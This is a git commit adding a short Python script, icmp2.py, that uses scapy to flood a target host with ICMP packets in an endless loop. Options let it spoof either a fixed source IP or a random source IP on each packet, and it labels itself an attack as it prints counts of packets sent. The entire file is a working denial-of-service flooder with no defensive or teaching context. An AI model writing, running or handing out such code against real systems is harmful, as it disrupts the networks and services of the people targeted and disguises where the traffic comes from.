7f0b50fab2a4a1701aa849215a65d49444a23de8
lilmond <54730301+lilmond@users.noreply.github.com>
2021-10-01 13:24:39 +0000

    Create icmp2.py

---
+++ icmp2.py
@@ -0,0 +1,58 @@
+from scapy.all import *
+import argparse
+import socket
+import random
+import time
+
+def randip() -> "str":
+    ip = []
+    for _ in range(4):
+        num = random.randrange(0, 256)
+        ip.append(str(num))
+    return ".".join(ip)
+
+def main():
+    parser = argparse.ArgumentParser()
+    parser.add_argument("host", nargs="?", metavar="HOST", type=str, help="Target host")
+    parser.add_argument("-s", "--source", metavar="SOURCE", type=str, help="Spoof single custom source IP")
+    parser.add_argument("-r", "--random-source", action="store_true", help="Spoof random source IP's")
+    parser.add_argument("-l", "--length", metavar="LENGTH", type=int, default=56, help="ICMP message lengtht")
+
+    args = parser.parse_args()
+    sent = 0
+
+    try:
+        print(f"INFO: Resolving host")
+        host = socket.gethostbyname(args.host)
+        print(f"INFO: Initializing attack...")
+        if args.source:
+            source_ip = socket.gethostbyname(args.source)
+            packet = IP(src=source_ip, dst=args.host) / ICMP() / ("X" * args.length)
+            while True:
+                send(packet, verbose=0)
+                sent += 1
+                if sent % 50 == 0:
+                    print(f"Sent -> {sent}")
+                time.sleep(1 / 1000)
+        elif args.random_source:
+            packet = IP(dst=args.host) / ICMP() / ("X" * args.length)
+            while True:
+                packet[IP].src = randip()
+                send(packet, verbose=0)
+                sent += 1
+                if sent % 50 == 0:
+                    print(f"Sent -> {sent}")
+                time.sleep(1 / 100)
+        else:
+            packet = IP(dst=args.host) / ICMP() / ("X" * args.length)
+            while True:
+                send(packet, verbose=0)
+                sent += 1
+                if sent % 50 == 0:
+                    print(f"Sent -> {sent}")
+                time.sleep(1 / 1000)
+    except KeyboardInterrupt:
+        pass
+
+if __name__ == "__main__":
+    main()
